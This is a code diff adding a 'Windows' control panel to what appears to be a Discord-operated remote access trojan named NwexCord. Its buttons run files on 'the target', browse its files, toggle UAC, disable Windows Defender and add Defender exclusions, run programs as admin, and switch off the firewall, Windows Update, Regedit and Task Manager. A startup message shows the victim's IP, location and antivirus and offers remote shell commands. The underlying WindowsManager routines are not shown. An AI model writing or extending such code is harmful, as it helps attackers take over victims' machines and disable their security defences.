+        success, path_or_msg, all_items = WindowsManager.file_manager_list(self.current_path)
+        query = str(self.search_query).strip()
+        if success:
+            embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id, all_items, search_query=query)
+            view = FileManagerView(self.session_id, self.current_path, items)
+            await interaction.edit_original_response(content=None, embed=embed, view=view)
+        else:
+            embed = discord.Embed(title="❌ Search Error", description=path_or_msg, color=discord.Color.red())
+            await interaction.edit_original_response(content=None, embed=embed, view=FileManagerView(self.session_id, self.current_path, []))
+
+
+class FileManagerView(discord.ui.View):
+    """Full interactive File Manager view."""
+    def __init__(self, session_id: str, current_path: str, items: list = None, selected_idx: int = -1):
+        super().__init__(timeout=300)
+        self.session_id = session_id
+        self.current_path = current_path
+        self.selected_idx = selected_idx
+
+        if items is None:
+            success, path_or_msg, items = WindowsManager.file_manager_list(current_path)
+            if not success:
+                items = []
+        self.items_data = items
+
+        # Row 0: File/folder select
+        self.add_item(FileManagerItemSelect(session_id, current_path, items))
+        # Row 1: Action select
+        self.add_item(FileManagerActionSelect(session_id, current_path, items, selected_idx))
+
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        parent = os.path.dirname(self.current_path)
+        if not parent or parent == self.current_path:
+            parent = self.current_path
+        embed, items, fc, fic = build_file_manager_embed(parent, self.session_id)
+        view = FileManagerView(self.session_id, parent, items)
+        await interaction.response.edit_message(content=None, embed=embed, view=view)
+
+    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=2)
+    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        embed, items, fc, fic = build_file_manager_embed(self.current_path, self.session_id)
+        view = FileManagerView(self.session_id, self.current_path, items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+    @discord.ui.button(label="Search", emoji="🔍", style=discord.ButtonStyle.primary, row=2)
+    async def search_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(FMSearchModal(self.session_id, self.current_path))
+
+    @discord.ui.button(label="Back to Windows", emoji="🪟", style=discord.ButtonStyle.secondary, row=2)
+    async def back_windows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_windows_panel(), view=WindowsPanelView())
+
+
+def embed_windows_panel():
+    """Create the Windows panel embed."""
+    embed = discord.Embed(
+        title="🪟 NwexCord Windows",
+        description=(
+            "Select a Windows tool from the buttons below.\n\n"
+            "▶️ **Run File** — Run a file on the target\n"
+            "📂 **File Manager** — Browse files on the target\n"
+            "🛡️ **UAC Bypass** — Enable/Disable UAC\n"
+            "🔒 **WDDisable** — Enable/Disable Windows Defender\n"
+            "📁 **WDExclusion** — Add Defender exclusion path\n"
+            "⚡ **ElevatedPrivileges** — Run program as admin\n"
+            "🔄 **Windows Update** — Enable/Disable Updates\n"
+            "🔑 **Regedit** — Enable/Disable Registry Editor\n"
+            "🧱 **Firewall** — Enable/Disable Firewall\n"
+            "📊 **Task Manager** — Enable/Disable Task Manager"
+        ),
+        color=discord.Color.from_rgb(0, 120, 215)
+    )
+    embed.set_footer(text="NwexCord • Windows Panel")
+    return embed
+
+
+class RunFileModal(discord.ui.Modal, title="▶️ Run File"):
+    file_path = discord.ui.TextInput(
+        label="File Path",
+        placeholder="C:\\path\\to\\file.exe",
+        style=discord.TextStyle.short,
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.run_file, str(self.file_path))
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(title=f"{status} Run File", description=msg, color=color)
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+
+class ElevatedPrivilegesModal(discord.ui.Modal, title="⚡ Elevated Privileges"):
+    file_path = discord.ui.TextInput(
+        label="File Path (to run as administrator)",
+        placeholder="C:\\path\\to\\program.exe",
+        style=discord.TextStyle.short,
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.run_elevated, str(self.file_path))
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(title=f"{status} Elevated Privileges", description=msg, color=color)
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+
+class WDExclusionModal(discord.ui.Modal, title="📁 WD Exclusion"):
+    exc_path = discord.ui.TextInput(
+        label="Path to Exclude",
+        placeholder="C:\\path\\to\\exclude",
+        style=discord.TextStyle.short,
+        required=True
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.wd_exclusion, str(self.exc_path))
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(title=f"{status} WD Exclusion", description=msg, color=color)
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+
+class WindowsResultView(discord.ui.View):
+    """View shown after a Windows tool executes, with Back button."""
+    def __init__(self):
+        super().__init__(timeout=300)
+
+    @discord.ui.button(label="Back to Windows", emoji="⬅", style=discord.ButtonStyle.secondary)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_windows_panel(), attachments=[], view=WindowsPanelView())
+
+
+class WindowsPanelView(discord.ui.View):
+    """The panel with all Windows tool buttons."""
+    def __init__(self):
+        super().__init__(timeout=300)
+
+    # Row 0
+    @discord.ui.button(label="Run File", emoji="▶️", style=discord.ButtonStyle.secondary, row=0)
+    async def run_file_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(RunFileModal())
+
+    @discord.ui.button(label="File Manager", emoji="📂", style=discord.ButtonStyle.secondary, row=0)
+    async def file_manager_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        session_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:20].upper()
+        embed, items, fc, fic = build_file_manager_embed("C:\\", session_id)
+        view = FileManagerView(session_id, "C:\\", items)
+        await interaction.edit_original_response(content=None, embed=embed, view=view)
+
+    @discord.ui.button(label="UAC Bypass", emoji="🛡️", style=discord.ButtonStyle.secondary, row=0)
+    async def uac_bypass_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_enabled = WindowsManager.get_uac_status()
+        # Toggle: if enabled -> disable, if disabled -> enable
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.uac_bypass, not is_enabled)
+        new_state = not is_enabled
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} UAC Bypass",
+            description=f"{msg}\n\n**Current UAC Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    @discord.ui.button(label="WDDisable", emoji="🔒", style=discord.ButtonStyle.danger, row=0)
+    async def wd_disable_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_enabled = WindowsManager.get_wd_status()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.wd_toggle, not is_enabled)
+        new_state = not is_enabled
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} WDDisable",
+            description=f"{msg}\n\n**Current Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    @discord.ui.button(label="WDExclusion", emoji="📁", style=discord.ButtonStyle.secondary, row=0)
+    async def wd_exclusion_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(WDExclusionModal())
+
+    # Row 1
+    @discord.ui.button(label="ElevatedPrivileges", emoji="⚡", style=discord.ButtonStyle.secondary, row=1)
+    async def elevated_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(ElevatedPrivilegesModal())
+
+    @discord.ui.button(label="Windows Update", emoji="🔄", style=discord.ButtonStyle.secondary, row=1)
+    async def winupdate_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_running = WindowsManager.get_winupdate_status()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.windows_update, not is_running)
+        new_state = not is_running
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} Windows Update",
+            description=f"{msg}\n\n**Current Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    @discord.ui.button(label="Regedit", emoji="🔑", style=discord.ButtonStyle.secondary, row=1)
+    async def regedit_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_enabled = WindowsManager.get_regedit_status()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.regedit_toggle, not is_enabled)
+        new_state = not is_enabled
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} Regedit",
+            description=f"{msg}\n\n**Current Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    @discord.ui.button(label="Firewall", emoji="🧱", style=discord.ButtonStyle.secondary, row=1)
+    async def firewall_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_enabled = WindowsManager.get_firewall_status()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.firewall_toggle, not is_enabled)
+        new_state = not is_enabled
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} Firewall",
+            description=f"{msg}\n\n**Current Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    @discord.ui.button(label="Task Manager", emoji="📊", style=discord.ButtonStyle.secondary, row=1)
+    async def taskmgr_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer()
+        is_enabled = WindowsManager.get_taskmgr_status()
+        loop = asyncio.get_event_loop()
+        success, msg = await loop.run_in_executor(None, WindowsManager.taskmgr_toggle, not is_enabled)
+        new_state = not is_enabled
+        status_icon = "🟢 Enabled" if new_state else "🔴 Disabled"
+        status = "✅" if success else "❌"
+        color = discord.Color.green() if success else discord.Color.red()
+        embed = discord.Embed(
+            title=f"{status} Task Manager",
+            description=f"{msg}\n\n**Current Status:** {status_icon}",
+            color=color
+        )
+        embed.set_footer(text="NwexCord • Windows")
+        await interaction.edit_original_response(content=None, embed=embed, view=WindowsResultView())
+
+    # Row 2: Back
+    @discord.ui.button(label="⬅ Back", style=discord.ButtonStyle.secondary, row=2)
+    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        """Return to the startup info message."""
+        await interaction.response.defer()
+        info = get_sys_info()
+        left_col = (
+            f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
+            f"👤 **UserName** : {info['UserName']}\n"
+            f"🖥️ **PCName** : {info['PCName']}\n"
+            f"🪟 **OS** : {info['OS']}\n"
+            f"📁 **Client** : {info['Client']}\n"
+            f"⚙️ **Process** : {info['Process']}\n"
+            f"📅 **DateTime** : {info['DateTime']}\n"
+            f"🎇 **GPU** : {info['GPU']}\n"
+            f"🧠 **CPU** : {info['CPU']}\n"
+            f"🏷️ **Identifier** : {info['Identifier']}\n"
+            f"📊 **Ram** : {info['Ram']}"
+        )
+        right_col = (
+            f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
+            f"⏱️ **LastReboot** : {info['LastReboot']}\n"
+            f"🛡️ **Antivirus** : {info['Antivirus']}\n"
+            f"⚠️ **Firewall** : {info['Firewall']}\n"
+            f"🌐 **MacAddress** : {info['MacAddress']}\n"
+            f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
+            f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
+            f"💻 **Platform** : {info['Platform']}\n"
+            f"📋 **Ver** : {info['Ver']}\n"
+            f"🔵 **.Net** : {info['.Net']}\n"
+            f"🔋 **Battery** : {info['Battery']}"
+        )
+        embed = discord.Embed(title="[ Information ]", color=discord.Color.dark_theme())
+        embed.add_field(name="\u200b", value=left_col, inline=True)
+        embed.add_field(name="\u200b", value=right_col, inline=True)
+        embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
+        msg_content = f"🚀 **NwexCord System Started!**\nUse `.shell <command>` to execute CMD/PowerShell commands on this machine."
+        await interaction.edit_original_response(content=msg_content, embed=embed, view=StartupView())
 
 
 class StartupView(discord.ui.View):
@@ -3656,6 +4913,10 @@ class StartupView(discord.ui.View):
     @discord.ui.button(label="System", emoji="⚙️", style=discord.ButtonStyle.secondary)
     async def system_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.edit_message(content=None, embed=embed_system_panel(), view=SystemPanelView())
+
+    @discord.ui.button(label="Windows", emoji="🪟", style=discord.ButtonStyle.success)
+    async def windows_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.edit_message(content=None, embed=embed_windows_panel(), view=WindowsPanelView())
 
 @bot.event
 async def on_ready():
